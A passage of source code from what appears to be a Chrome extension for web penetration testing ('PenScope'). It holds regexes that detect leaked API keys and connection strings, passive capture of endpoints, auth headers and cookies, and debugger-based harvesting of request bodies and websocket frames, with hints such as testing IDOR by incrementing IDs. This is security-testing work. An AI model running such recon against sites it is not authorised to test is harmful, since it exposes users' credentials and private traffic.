  {name:"MongoDB error",regex:/(?:MongoError|MongoServerError|BSONTypeError)/g,sev:"high",desc:"MongoDB error"},
  {name:"Debug mode",regex:/"(?:debug|DEBUG|dev_mode|environment|NODE_ENV)"\s*:\s*"?(?:true|1|development|staging|dev)/gi,sev:"medium",desc:"Debug/dev mode active"},
  {name:"Internal path",regex:/(?:\/home\/\w+\/\w|\/var\/(?:www|log|lib)\/\w|\/opt\/\w+\/\w|\/srv\/\w+\/\w|C:\\(?:Users|inetpub|Program)\\|\/usr\/local\/\w|\/etc\/\w+\/\w|\/tmp\/\w+\/\w)/g,sev:"medium",desc:"Filesystem path leaked"},
  {name:"Connection string",regex:/(?:Server|Data Source|Host)\s*=\s*[^;]{5,};\s*(?:Database|Initial Catalog)\s*=/gi,sev:"critical",desc:"DB connection string"},
  {name:"GraphQL introspection",regex:/"__schema"|"__type"|"queryType"|"mutationType"/g,sev:"high",desc:"GraphQL introspection enabled"},
  {name:"Pagination meta",regex:/"(?:total_count|totalCount|total_pages|totalPages|total_records)"\s*:\s*"?(\d+)/gi,sev:"low",desc:"Dataset size revealed"},
  {name:"Version info",regex:/"(?:version|api_version|app_version|build|build_number|commit|git_sha)"\s*:\s*"([^"]{1,40})"/gi,sev:"info",desc:"Version disclosure"},
  {name:"Redirect URL",regex:/"(?:redirect_uri|redirect_url|return_url|returnUrl|next|callback_url|continue|goto)"\s*:\s*"(https?:\/\/[^"]+)"/gi,sev:"medium",desc:"Redirect URL — open redirect test"},
  {name:"Upload URL",regex:/"(?:upload_url|uploadUrl|presigned_url|presignedUrl|signed_url)"\s*:\s*"(https?:\/\/[^"]+)"/gi,sev:"medium",desc:"Pre-signed upload URL"},
  {name:"Webhook URL",regex:/"(?:webhook_url|webhookUrl|callback_url|notify_url)"\s*:\s*"(https?:\/\/[^"]+)"/gi,sev:"medium",desc:"Webhook URL exposed"},
  {name:"Feature flag",regex:/"(?:feature_flag|featureFlag|feature_enabled|experiment|ab_test|variant)"\s*:\s*"?([^",}\]]{1,50})/gi,sev:"low",desc:"Feature flag exposed"},
  {name:"AWS ARN in resp",regex:/arn:aws:[a-z0-9-]+:[a-z0-9-]*:\d{12}:[a-zA-Z0-9/_-]+/g,sev:"medium",desc:"AWS ARN exposed"},
  {name:"Internal URL",regex:/"(?:internal_url|internalUrl|private_url|backend_url|service_url)"\s*:\s*"(https?:\/\/[^"]+)"/gi,sev:"high",desc:"Internal/private URL exposed"},
  // AI/LLM API keys in responses
  {name:"OpenAI API Key",regex:/sk-[a-zA-Z0-9]{20,}T3BlbkFJ[a-zA-Z0-9]{20,}/g,sev:"critical",desc:"OpenAI API key in response"},
  {name:"Anthropic API Key",regex:/sk-ant-api03-[a-zA-Z0-9_-]{90,}/g,sev:"critical",desc:"Anthropic API key in response"},
  {name:"Google AI Key",regex:/AIza[A-Za-z0-9_-]{35}/g,sev:"high",desc:"Google AI/API key in response"},
  {name:"HuggingFace Token",regex:/hf_[a-zA-Z0-9]{34,}/g,sev:"high",desc:"HuggingFace token in response"},
];

// v6.1.1 — Performance: skip the expensive analysis path for "noisy" hosts —
// video chunks, ad networks, telemetry endpoints, large CDNs that don't host app
// code. On YouTube specifically, googlevideo.com fires hundreds of chunk requests
// per minute; running 14 AUTH_PATTERN regexes + path-param detection + subdomain
// classification + Swagger lookup on each is a meaningful drag on the renderer.
// Noisy hosts still get logged as endpoints (one push, minimal metadata) so they
// show up in the site map, but skip the expensive enrichment.
const NOISY_HOST_SUFFIXES=[
  // Video / media CDNs
  "googlevideo.com","ytimg.com","youtube-nocookie.com",
  "twitch.tv","ttvnw.net","jtvnw.net",
  "vimeocdn.com","akamaized.net","cloudfront.net","fbcdn.net","cdninstagram.com",
  "tiktokcdn.com","ibytedtos.com","muscdn.com","tiktokv.com",
  "spotifycdn.com","scdn.co",
  // Ad networks + analytics (high frequency, low recon value)
  "doubleclick.net","googlesyndication.com","googletagmanager.com","google-analytics.com",
  "googleadservices.com","adservice.google.com","2mdn.net","adnxs.com",
  "scorecardresearch.com","quantserve.com","outbrain.com","taboola.com",
  "facebook.com/tr","connect.facebook.net","analytics.tiktok.com","analytics.twitter.com",
  "branch.io","amplitude.com","heap.io","mixpanel.com","segment.com","segment.io",
  "hotjar.com","mouseflow.com","fullstory.com","logrocket.com","sentry-cdn.com","sentry.io",
  "datadog-rum.com","newrelic.com","nr-data.net","optimizely.com","launchdarkly.com",
  "bugsnag.com","appdynamics.com","kissmetrics.com","crazyegg.com",
  // Static asset CDNs that don't host app code
  "gstatic.com","googleusercontent.com","googleapis.com",
  "fonts.googleapis.com","fonts.gstatic.com",
  "telemetry.mozilla.org","incoming.telemetry.mozilla.org",
];
// v6.1.1 — Full-capture override. When the user enables the "Full capture on noisy
// hosts" toggle in the probe menu, isNoisyHost() always returns false, restoring
// the v6.0 behavior. Persisted to chrome.storage.local; restored at SW startup.
let _fullCaptureEnabled=false;
try{chrome.storage.local.get(["penscopeFullCapture"],r=>{if(typeof r.penscopeFullCapture==="boolean")_fullCaptureEnabled=r.penscopeFullCapture;});}catch(e){}
function isNoisyHost(hostname){
  if(_fullCaptureEnabled)return false;
  if(!hostname)return false;
  for(let i=0;i<NOISY_HOST_SUFFIXES.length;i++){
    const s=NOISY_HOST_SUFFIXES[i];
    if(hostname===s||hostname.endsWith("."+s))return true;
  }
  return false;
}
// Cheap-to-check resource types that almost never carry security-relevant URL params.
// We still capture the request as an endpoint, but skip AUTH_PATTERNS, path params,
// API version, Swagger, etc.
const LIGHT_TYPES={"image":1,"imageset":1,"media":1,"font":1,"stylesheet":1,"object":1,"ping":1,"csp_report":1};

// -------------------------------------------------------
// 1. PASSIVE — webRequest
// -------------------------------------------------------
chrome.webRequest.onBeforeRequest.addListener((details)=>{
  if(details.tabId<0)return;const tab=T(details.tabId);let url;try{url=new URL(details.url);}catch{return;}
  if(url.protocol==="chrome-extension:"||url.protocol==="data:"||url.protocol==="chrome:")return;
  const path=url.pathname;const epKey=`${details.method||"GET"}:${url.hostname}:${path}`;
  // v6.1.1 — fast path for noisy hosts and lightweight resource types: log the
  // endpoint and bail. Skips the regex array + Set ops + tag rules below.
  const noisy=isNoisyHost(url.hostname);
  const light=!!LIGHT_TYPES[details.type];
  if(noisy||light){
    if(!seen(details.tabId,"ep",epKey)){
      const ep={method:details.method||"GET",url:details.url,path,host:url.hostname,query:url.search,type:details.type,timestamp:Date.now(),initiator:details.initiator||"",tags:[],status:null,responseSize:null};
      tab.endpoints.push(ep);tab.endpointIndex.set(details.url,ep);
    }
    return;
  }
  const tags=tagEndpoint(path);
  if(!seen(details.tabId,"ep",epKey)){const ep={method:details.method||"GET",url:details.url,path,host:url.hostname,query:url.search,type:details.type,timestamp:Date.now(),initiator:details.initiator||"",tags,status:null,responseSize:null};tab.endpoints.push(ep);tab.endpointIndex.set(details.url,ep);}
  url.searchParams.forEach((val,key)=>{const pk=`q:${path}:${key}`;if(!tab.params[pk])tab.params[pk]={path,param:key,example:val.substring(0,100),source:"query",method:details.method||"GET"};});
  if(details.requestBody?.formData)for(const[key,vals]of Object.entries(details.requestBody.formData)){const pk=`b:${path}:${key}`;if(!tab.params[pk])tab.params[pk]={path,param:key,example:(vals[0]||"").substring(0,100),source:"body",method:details.method||"GET"};}
  AUTH_PATTERNS.forEach(p=>{if(p.regex.test(path)&&!seen(details.tabId,"auth",`${p.type}:${path}`))tab.authFlows.push({type:p.type,method:details.method||"GET",url:details.url,path,host:url.hostname});});
  if(tab.url){try{const mh=new URL(tab.url).hostname,md=mh.split(".").slice(-2).join("."),rd=url.hostname.split(".").slice(-2).join(".");if(rd===md&&url.hostname!==mh&&!seen(details.tabId,"sub",url.hostname))tab.subdomains.push(url.hostname);else if(rd!==md&&!seen(details.tabId,"3p",url.hostname))tab.thirdParty.push({host:url.hostname,type:details.type,url:details.url});}catch(e){console.warn('[PenScope] subdomain detect',e.message||e);}}
  if(details.type==="script"&&path.endsWith(".js")&&!seen(details.tabId,"sm",details.url)){const cleanUrl=details.url.split("?")[0];tab.sourceMaps.push({url:details.url,mapUrl:cleanUrl+".map",source:"request"});}
  if(details.type==="websocket"&&!seen(details.tabId,"ws",details.url))tab.wsConnections.push({url:details.url,host:url.hostname,path,timestamp:Date.now()});
  // v5.4: gRPC endpoint detection
  if((/\.proto(?:\?|$)/i.test(path)||/\/grpc[.-\/]/i.test(path)||/\/grpc$/i.test(path))&&!seen(details.tabId,"grpc",details.url)){tab.grpcEndpoints.push({url:details.url,path,host:url.hostname,type:path.endsWith(".proto")?"protobuf-definition":"grpc-endpoint",method:details.method||"GET",timestamp:Date.now()});}
  // v5.4: gRPC-Web detection via content-type (will be enriched in onHeadersReceived)
  detectApiVersion(path,details.tabId);checkSwagger(path,details.url,details.tabId);

  // v4: Extract path parameters
  const segments=path.split("/").filter(Boolean);
  segments.forEach((seg,i)=>{
    if(/^\d{3,}$/.test(seg)){const key=`pnum:${segments.slice(0,i).join("/")}`;if(!seen(details.tabId,"pp",key))tab.pathParams.push({path,paramIndex:i,value:seg,type:"numeric-id",context:segments.slice(Math.max(0,i-1),i+2).join("/"),risk:"IDOR — try incrementing"});}
    if(/^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$/i.test(seg)){const key=`puuid:${segments.slice(0,i).join("/")}`;if(!seen(details.tabId,"pp",key))tab.pathParams.push({path,paramIndex:i,value:seg,type:"uuid",context:segments.slice(Math.max(0,i-1),i+2).join("/"),risk:"UUID — test with other user UUIDs"});}
  });
},{urls:["<all_urls>"]},["requestBody"]);

// -------------------------------------------------------
// 2. RESPONSE HEADERS
// -------------------------------------------------------
chrome.webRequest.onHeadersReceived.addListener((details)=>{
  if(details.tabId<0)return;const valid=["main_frame","xmlhttprequest","other","sub_frame"];if(!valid.includes(details.type))return;
  // v6.1.1 — short-circuit noisy hosts here too. Telemetry endpoints often arrive
  // as xmlhttprequest (so the type filter above doesn't reject them) and they're
  // the second-largest source of overhead on YouTube/SaaS apps after webRequest.
  try{const u=new URL(details.url);if(isNoisyHost(u.hostname))return;}catch(e){return;}
  const tab=T(details.tabId);const hdrs={},leaks=[];
  (details.responseHeaders||[]).forEach(h=>{const n=h.name.toLowerCase();hdrs[n]=h.value;if(LEAK_HEADERS.includes(n))leaks.push({name:h.name,value:h.value});if(TECH_MAP[n]){const tech=TECH_MAP[n](h.value);if(tech&&!seen(details.tabId,"tech-hdr",tech))tab.techStack.push({name:tech,source:"header",confidence:"high"});}if(n==="sourcemap"||n==="x-sourcemap"){if(!seen(details.tabId,"sm",h.value))tab.sourceMaps.push({url:details.url,mapUrl:h.value,source:"header"});}});
  const statusCode=details.statusCode;
  try{const u=new URL(details.url);const ep=tab.endpointIndex.get(details.url)||tab.endpoints.find(e=>e.host===u.hostname&&e.path===u.pathname&&e.method===(details.method||"GET"));if(ep&&!ep.status)ep.status=statusCode;const metaKey=`${details.method||"GET"}:${u.pathname}`;if(!tab.endpointMeta[metaKey])tab.endpointMeta[metaKey]={statuses:new Set(),sizes:[],queries:new Set()};tab.endpointMeta[metaKey].statuses.add(statusCode);if(u.search)tab.endpointMeta[metaKey].queries.add(u.search);}catch(e){console.warn('[PenScope] headerMeta',e.message||e);}
  if(statusCode>=300&&statusCode<400){const location=hdrs["location"];if(location&&!seen(details.tabId,"redir",`${details.url}->${location}`))tab.redirectChains.push({from:details.url,to:location,status:statusCode});}
  // v5.3.1: Header intelligence — capture interesting headers from ALL responses
  const INTEL_HEADERS={"x-request-id":"Request Trace ID","x-correlation-id":"Correlation ID","x-trace-id":"Trace ID","x-amzn-requestid":"AWS Request ID","x-amz-request-id":"S3 Request ID","x-amz-cf-id":"CloudFront ID","cf-ray":"Cloudflare Ray ID","x-forwarded-for":"Proxy Chain","x-real-ip":"Real IP","via":"Proxy Via","server-timing":"Server Timing","x-cache":"Cache Status","x-cache-hits":"Cache Hits","x-served-by":"Served By","x-backend-server":"Backend Server","x-upstream":"Upstream Server","x-debug-token":"Debug Token","x-debug-token-link":"Debug Link","x-runtime":"Runtime (seconds)","x-request-time":"Request Time","x-response-time":"Response Time","x-ratelimit-limit":"Rate Limit","x-ratelimit-remaining":"Rate Remaining","x-ratelimit-reset":"Rate Reset","x-powered-by":"Powered By","x-aspnet-version":"ASP.NET Version","x-aspnetmvc-version":"ASP.NET MVC Version","x-generator":"Generator","x-dns-prefetch-control":"DNS Prefetch Control","x-download-options":"Download Options","x-permitted-cross-domain-policies":"Cross-Domain Policy","x-xss-protection":"XSS Protection","x-envoy-upstream-service-time":"Envoy Service Time","x-amzn-trace-id":"AWS Trace ID","x-cloud-trace-context":"GCP Trace","x-appengine-resource-usage":"AppEngine Usage","x-firebase-hosting":"Firebase Hosting","x-request-start":"Request Start Time","x-queue-time":"Queue Time","x-served-with":"Served With","x-middleware":"Middleware","x-proxy":"Proxy Info","x-varnish":"Varnish Cache ID","x-drupal-dynamic-cache":"Drupal Dynamic Cache","x-litespeed-cache":"LiteSpeed Cache","x-cache-status":"Cache Status (Detailed)","x-edge-location":"Edge Location","x-amz-bucket-region":"AWS S3 Bucket Region","x-kong-proxy-latency":"Kong Proxy Latency","x-kong-upstream-latency":"Kong Upstream Latency","x-b3-traceid":"Zipkin Trace ID","x-datadog-trace-id":"Datadog Trace ID","x-request-cost":"Request Cost","x-database-queries":"Database Query Count"};
  (details.responseHeaders||[]).forEach(h=>{
    const n=h.name.toLowerCase();
    if(INTEL_HEADERS[n]&&h.value){
      const iKey=`hi:${n}:${h.value.substring(0,30)}`;
      if(!seen(details.tabId,"hi",iKey)&&tab.headerIntel.length<200){
        try{const u=new URL(details.url);
        tab.headerIntel.push({header:h.name,value:h.value.substring(0,500),label:INTEL_HEADERS[n],url:u.pathname,host:u.hostname,status:statusCode});}catch(e){console.warn('[PenScope] headerIntel',e.message||e);}
      }
    }
  });
  // Detect sensitive data in ALL response headers
  const SENSITIVE_HEADER_PATTERNS=[
    {name:"Internal IP in header",regex:/(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})/,sev:"medium"},
    {name:"Email in header",regex:/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/,sev:"low"},
    {name:"Path disclosure in header",regex:/(?:\/home\/\w+|\/var\/www|\/opt\/|C:\\\\)/,sev:"medium"},
    {name:"Version disclosure",regex:/\d+\.\d+\.\d+/,sev:"info"},
    {name:"AWS Account ID",regex:/\d{12}/,sev:"medium"},
  ];
  (details.responseHeaders||[]).forEach(h=>{
    const n=h.name.toLowerCase();if(!h.value)return;
    for(const sp of SENSITIVE_HEADER_PATTERNS){
      if(sp.regex.test(h.value)){
        const sKey=`sh:${n}:${sp.name}`;
        if(!seen(details.tabId,"hi",sKey)&&tab.headerIntel.length<200){
          try{const u=new URL(details.url);
          tab.headerIntel.push({header:h.name,value:h.value.substring(0,500),label:sp.name,url:u.pathname,host:u.hostname,status:statusCode,severity:sp.sev});}catch(e){console.warn('[PenScope] sensitiveHeader',e.message||e);}
        }
      }
    }
  });
  // CORS preflight data extraction — capture from ALL responses
  const CORS_HEADERS={"access-control-allow-methods":"CORS Allowed Methods","access-control-allow-headers":"CORS Allowed Headers","access-control-expose-headers":"CORS Exposed Headers","access-control-max-age":"CORS Cache Duration"};
  (details.responseHeaders||[]).forEach(h=>{
    const n=h.name.toLowerCase();
    if(CORS_HEADERS[n]&&h.value){
      const cKey=`cors:${n}:${h.value.substring(0,30)}`;
      if(!seen(details.tabId,"hi",cKey)&&tab.headerIntel.length<200){
        try{const u=new URL(details.url);
        tab.headerIntel.push({header:h.name,value:h.value.substring(0,500),label:CORS_HEADERS[n],url:u.pathname,host:u.hostname,status:statusCode});}catch(e){console.warn('[PenScope] corsHeaders',e.message||e);}
      }
    }
  });
  // v5.4: gRPC-Web detection via content-type header
  const ct=hdrs["content-type"]||"";
  if((ct.includes("application/grpc")||ct.includes("application/grpc-web"))&&!seen(details.tabId,"grpc",details.url)){
    try{const u=new URL(details.url);tab.grpcEndpoints.push({url:details.url,path:u.pathname,host:u.hostname,type:"grpc-web",contentType:ct.substring(0,100),status:statusCode,timestamp:Date.now()});}catch(e){console.warn('[PenScope] grpcWeb',e.message||e);}
  }
  if(details.type!=="main_frame")return;
  const missing=[];for(const[header,info]of Object.entries(SEC_HEADERS))if(!hdrs[header])missing.push({header,severity:info.sev,desc:info.desc});
  let cspAnalysis=null;if(hdrs["content-security-policy"])cspAnalysis=analyzeCSP(hdrs["content-security-policy"]);
  const corsIssues=[];const acao=hdrs["access-control-allow-origin"],acac=hdrs["access-control-allow-credentials"];if(acao==="*")corsIssues.push({header:"ACAO: *",severity:"high",desc:"Wildcard CORS"});if(acac==="true"&&acao==="*")corsIssues.push({header:"CORS cred+wildcard",severity:"critical",desc:"Full CORS bypass"});if(acac==="true"&&acao&&acao!=="*")corsIssues.push({header:`CORS reflects: ${acao}`,severity:"medium",desc:"Test arbitrary origin reflection"});
  const cookieIssues=[];(details.responseHeaders||[]).filter(h=>h.name.toLowerCase()==="set-cookie").forEach(h=>{const v=h.value.toLowerCase(),name=h.value.split("=")[0].trim();if(!v.includes("httponly"))cookieIssues.push({cookie:name,issue:"No HttpOnly",severity:"medium"});if(!v.includes("secure"))cookieIssues.push({cookie:name,issue:"No Secure",severity:"medium"});if(!v.includes("samesite"))cookieIssues.push({cookie:name,issue:"No SameSite",severity:"medium"});});
  const entry={url:details.url,type:details.type,missing,leaks,corsIssues,cookieIssues,cspAnalysis,raw:hdrs,timestamp:Date.now()};
  const idx=tab.headers.findIndex(h=>h.type==="main_frame");if(idx>=0)tab.headers[idx]=entry;else tab.headers.push(entry);
},{urls:["<all_urls>"]},["responseHeaders"]);

function analyzeCSP(csp){const dirs={},issues=[];csp.split(";").forEach(d=>{const p=d.trim().split(/\s+/);if(p.length>=1)dirs[p[0]]=p.slice(1);});for(const[dir,vals]of Object.entries(dirs)){if(vals.includes("'unsafe-inline'"))issues.push({severity:"high",desc:`${dir}: 'unsafe-inline'`});if(vals.includes("'unsafe-eval'"))issues.push({severity:"high",desc:`${dir}: 'unsafe-eval'`});if(vals.includes("*"))issues.push({severity:"high",desc:`${dir}: wildcard *`});if(vals.includes("data:"))issues.push({severity:"medium",desc:`${dir}: data: URI`});vals.forEach(v=>{if(v.startsWith("http://"))issues.push({severity:"medium",desc:`${dir}: insecure HTTP ${v}`});});}if(!dirs["default-src"]&&!dirs["script-src"])issues.push({severity:"high",desc:"No default-src or script-src"});if(!dirs["base-uri"])issues.push({severity:"medium",desc:"No base-uri"});if(!dirs["form-action"])issues.push({severity:"low",desc:"No form-action"});if(!dirs["frame-ancestors"])issues.push({severity:"medium",desc:"No frame-ancestors"});return{raw:csp,directives:dirs,issues};}

// -------------------------------------------------------
// 3. DEEP LAYER
// -------------------------------------------------------
async function attachDebugger(tabId){if(_debugTabs.has(tabId))return true;return new Promise(resolve=>{chrome.debugger.attach({tabId},"1.3",()=>{if(chrome.runtime.lastError){resolve(false);return;}_debugTabs.add(tabId);T(tabId).deepEnabled=true;_scripts[tabId]=new Map();
  // Enable all useful domains
  chrome.debugger.sendCommand({tabId},"Network.enable",{});
  chrome.debugger.sendCommand({tabId},"Runtime.enable",{},()=>{void chrome.runtime.lastError;});
  chrome.debugger.sendCommand({tabId},"Page.enable",{},()=>{void chrome.runtime.lastError;});
  // v5: New domains
  chrome.debugger.sendCommand({tabId},"Debugger.enable",{maxScriptsCacheSize:50000000},()=>{void chrome.runtime.lastError;});
  chrome.debugger.sendCommand({tabId},"Log.enable",{},()=>{void chrome.runtime.lastError;});
  chrome.debugger.sendCommand({tabId},"Audits.enable",{},()=>{void chrome.runtime.lastError;});
  resolve(true);});});}
async function detachDebugger(tabId){if(!_debugTabs.has(tabId))return;return new Promise(resolve=>{chrome.debugger.detach({tabId},()=>{_debugTabs.delete(tabId);if(state[tabId])state[tabId].deepEnabled=false;resolve();});});}

chrome.debugger.onEvent.addListener((source,method,params)=>{
  const tabId=source.tabId;if(!tabId||!_debugTabs.has(tabId))return;const tab=T(tabId);
  switch(method){
    case "Network.requestWillBeSent":{const req=params.request;if(!req)break;if(params.redirectResponse){const from=params.redirectResponse.url||req.url,to=req.url,st=params.redirectResponse.status;if(!seen(tabId,"redir-d",`${from}->${to}`))tab.redirectChains.push({from,to,status:st});}const authHdrs=[];if(req.headers)for(const[name,value]of Object.entries(req.headers))if(AUTH_HDRS.includes(name.toLowerCase()))authHdrs.push({name,value:value.substring(0,500)});if(authHdrs.length){const hKey=authHdrs.map(h=>`${h.name}:${h.value.substring(0,20)}`).join("|");if(!seen(tabId,"rqh",hKey))tab.requestHeaders.push({url:req.url,method:req.method,headers:authHdrs,timestamp:Date.now()});}if(req.postData&&req.postData.length>2){
        // v5.3: Capture full POST/PUT/PATCH body for API requests
        const isWrite=["POST","PUT","PATCH","DELETE"].includes(req.method);
        if(isWrite&&req.postData.length>5){
          try{const u=new URL(req.url);const pKey=`pb:${req.method}:${u.pathname}`;
          if(!seen(tabId,"pb",pKey)&&tab.postBodies.length<CONFIG.MAX_POST_BODIES)tab.postBodies.push({method:req.method,url:req.url,path:u.pathname,contentType:(req.headers?.["Content-Type"]||req.headers?.["content-type"]||""),body:req.postData.substring(0,CONFIG.MAX_POST_BODY),timestamp:Date.now()});}catch(e){console.warn('[PenScope] postBody capture',e.message||e);}
        }
        try{const ct=(req.headers?.["Content-Type"]||req.headers?.["content-type"]||"").toLowerCase();if(ct.includes("json")||req.postData.startsWith("{")||req.postData.startsWith("[")){const obj=JSON.parse(req.postData);const extract=(o,prefix="")=>{if(typeof o!=="object"||!o)return;for(const[k,v]of Object.entries(o)){const pk=`jb:${new URL(req.url).pathname}:${prefix}${k}`;if(!tab.params[pk])tab.params[pk]={path:new URL(req.url).pathname,param:prefix?`${prefix}${k}`:k,example:String(v).substring(0,100),source:"json-body",method:req.method};}};extract(obj);}}catch(e){console.warn('[PenScope] JSON body parse',e.message||e);}}try{checkSwagger(new URL(req.url).pathname,req.url,tabId);}catch(e){console.warn('[PenScope] checkSwagger',e.message||e);}break;}
    case "Network.responseReceived":{const resp=params.response;if(!resp)break;const ct=(resp.mimeType||"").toLowerCase();const status=resp.status;const respSize=resp.encodedDataLength||0;try{const u=new URL(resp.url);const ep=tab.endpointIndex.get(resp.url)||tab.endpoints.find(e=>e.host===u.hostname&&e.path===u.pathname);if(ep){if(!ep.status)ep.status=status;ep.responseSize=respSize;}const epMethod=(ep&&ep.method)||"GET";const metaKey=`${epMethod}:${u.pathname}`;if(!tab.endpointMeta[metaKey])tab.endpointMeta[metaKey]={statuses:new Set(),sizes:[],queries:new Set()};tab.endpointMeta[metaKey].statuses.add(status);tab.endpointMeta[metaKey].sizes.push(respSize);}catch(e){console.warn('[PenScope] responseReceived meta',e.message||e);}
      // v5.3.2: Auto-queue .map files for body capture (passive source map harvesting)
      const isMap=(resp.url||"").endsWith(".map")||(resp.url||"").includes(".map?")||ct.includes("sourcemap");
      if(ct.includes("json")||ct.includes("html")||ct.includes("text")||ct.includes("xml")||ct.includes("javascript")||isMap||status>=400){_pending[`${tabId}:${params.requestId}`]={url:resp.url,status,mimeType:resp.mimeType,requestId:params.requestId,size:respSize,isError:status>=400,isSourceMap:isMap,_ts:Date.now()};}if(resp.securityDetails)tab.certInfo={protocol:resp.securityDetails.protocol,keyExchange:resp.securityDetails.keyExchange,cipher:resp.securityDetails.cipher,issuer:resp.securityDetails.issuer,validFrom:resp.securityDetails.validFrom,validTo:resp.securityDetails.validTo,subjectName:resp.securityDetails.subjectName,sanList:resp.securityDetails.sanList||[]};
      // Network timing analysis
      try{const u=new URL(resp.url);const timingKey=u.pathname;if(resp.timing){const totalMs=Math.round((resp.timing.receiveHeadersEnd||0)-(resp.timing.sendStart||0));if(totalMs>0){if(!tab.networkTiming[timingKey])tab.networkTiming[timingKey]=[];tab.networkTiming[timingKey].push({status,size:respSize,time:totalMs,url:resp.url.substring(0,150)});}}}catch(e){console.warn('[PenScope] networkTiming',e.message||e);}
      break;}
    case "Network.loadingFinished":{const key=`${tabId}:${params.requestId}`;const meta=_pending[key];if(!meta)break;delete _pending[key];
      const isJS=(meta.mimeType||"").includes("javascript")||(meta.url||"").endsWith(".js");
      const isJSON=(meta.mimeType||"").includes("json");
      const isAPI=/\/api\//i.test(meta.url||"");
      const isWasm=(meta.url||"").split("?")[0].endsWith(".wasm")||(meta.mimeType||"").includes("wasm");
      const bodyLimit=isJS?500000:isJSON?200000:isAPI?200000:isWasm?2000000:50000;
      chrome.debugger.sendCommand({tabId},"Network.getResponseBody",{requestId:params.requestId},(result)=>{
        if(chrome.runtime.lastError||!result||!result.body)return;
        // CDP returns non-UTF-8 bodies (WASM, images, fonts, protobufs) as base64. Decode WASM for binary
        // analysis; skip pattern scanning on other binary since atob() output corrupts text regexes.
        const isB64=result.base64Encoded===true;
        if(isB64){
          if(isWasm){try{processWasmBinary(tabId,meta.url,result.body,meta.status,meta.mimeType);}catch(e){console.warn('[PenScope] wasm binary',e.message||e);}}
          return;
        }
        const body=result.body.substring(0,bodyLimit);
        scanResponseBody(tabId,meta,body.substring(0,50000));
        if((isJSON||isAPI)&&body.length>10&&!meta.isError){
          try{const u=new URL(meta.url);const rbKey=`arb:${u.pathname}`;
          if(!seen(tabId,"arb",rbKey)&&tab.apiResponseBodies.length<100){
            const findings=deepScanBody(body,meta.url);
            tab.apiResponseBodies.push({url:meta.url,path:u.pathname,status:meta.status,size:body.length,contentType:meta.mimeType,bodyPreview:body.substring(0,500),findings,timestamp:Date.now()});
          }}catch(e){console.warn('[PenScope] apiResponseBody',e.message||e);}
        }
        if(isJS&&body.length>100){
          const scriptUrl=meta.url||"";
          if(!scriptUrl.includes("google-analytics")&&!scriptUrl.includes("gtag")&&!scriptUrl.includes("translate.googleapis")&&!scriptUrl.includes("gstatic.com")&&!scriptUrl.includes("recaptcha")&&!scriptUrl.includes("googletagmanager")){
            scanScriptViaNetwork(tabId,body,scriptUrl);
          }
        }
        if(meta.isError&&!seen(tabId,"err",`${meta.status}:${meta.url.substring(0,80)}`))tab.errorBodies.push({url:meta.url,status:meta.status,mimeType:meta.mimeType,body:body.substring(0,3000),size:meta.size,timestamp:Date.now()});
        if(meta.isSourceMap&&meta.status===200&&body.length>50&&body.indexOf('"sources"')>-1){
          try{if(!seen(tabId,"pmap",meta.url))parseAndStoreSourceMap(tabId,body,meta.url,"passive-network");}catch(e){console.warn('[PenScope] auto sourcemap',e.message||e);}
        }
      });break;}
    case "Network.webSocketFrameReceived":case "Network.webSocketFrameSent":{const dir=method.includes("Received")?"recv":"sent";const payload=params.response?.payloadData;if(payload&&payload.length>1){tab.wsMessages.push({direction:dir,data:payload.substring(0,2000),timestamp:Date.now()});if(payload.length>10)scanResponseBody(tabId,{url:`ws-${dir}`,status:0,mimeType:"websocket"},payload.substring(0,10000));}break;}
    case "Security.securityStateChanged":{if(params.summary){tab.certInfo=tab.certInfo||{};tab.certInfo.securityState=params.state;}break;}
    case "Page.frameNavigated":{
      if(params.frame?.parentId)break;
      if(!tab._coverageStarted){
        tab._coverageStarted=true;
        chrome.debugger.sendCommand({tabId},"Profiler.enable",{},()=>{
          if(!chrome.runtime.lastError)chrome.debugger.sendCommand({tabId},"Profiler.startPreciseCoverage",{callCount:true,detailed:false});
        });
      }else{
        // SPA route change — profiler already running, take a merging snapshot (throttled to 10s)
        const now=Date.now();
        if(!tab._lastCovSnap||now-tab._lastCovSnap>10000){
          tab._lastCovSnap=now;
          setTimeout(()=>takeCoverageSnapshot(tabId),2500);
        }
      }
      // Re-extract runtime/routes/storage on SPA navigation so single-page apps
      // don't show stale data from the first page load (throttled to avoid thrash)
      const nowR=Date.now();
      if(!tab._lastRuntimeReextract||nowR-tab._lastRuntimeReextract>8000){
        tab._lastRuntimeReextract=nowR;
        setTimeout(()=>{if(_debugTabs.has(tabId))runRuntimeExtraction(tabId);},2000);
      }
      break;}
    case "Page.loadEventFired":case "Page.domContentEventFired":{
      if(method==="Page.loadEventFired"){
        if(!tab._loadTimers)tab._loadTimers=[];
        tab._loadTimers.forEach(id=>clearTimeout(id));tab._loadTimers=[];
        tab._loadTimers.push(setTimeout(()=>runRuntimeExtraction(tabId),CONFIG.EXTRACTION_DELAY));
        tab._loadTimers.push(setTimeout(()=>extractAllScriptSources(tabId),CONFIG.SCRIPT_EXTRACT_DELAY_1));
        tab._loadTimers.push(setTimeout(()=>extractAllScriptSources(tabId),CONFIG.SCRIPT_EXTRACT_DELAY_2));
        tab._loadTimers.push(setTimeout(()=>runCoverageAnalysis(tabId),10000));
        tab._loadTimers.push(setTimeout(()=>mineMemoryStrings(tabId),4000));
        tab._loadTimers.push(setTimeout(()=>{const t=T(tabId);if(!t.memoryStrings.length){t._memoryMined=false;mineMemoryStrings(tabId);}},12000));
        tab._loadTimers.push(setTimeout(()=>dumpEventListeners(tabId),5000));
        tab._loadTimers.push(setTimeout(()=>pierceShadowDOM(tabId),5500));
        tab._loadTimers.push(setTimeout(()=>detectEncodedBlobs(tabId),6500));
        // v5.3.1: Network intelligence
        tab._loadTimers.push(setTimeout(()=>extractDNSPrefetch(tabId),3500));
        tab._loadTimers.push(setTimeout(()=>scanIframes(tabId),4500));
        tab._loadTimers.push(setTimeout(()=>{const t=T(tabId);if(!t.iframeScan.length){t._iframesScanned=false;scanIframes(tabId);}},11000));
        tab._loadTimers.push(setTimeout(()=>extractPerfEntries(tabId),7000));
        tab._loadTimers.push(setTimeout(()=>extractCSSContent(tabId),7500));
        // v5.4: New attack surface extractors
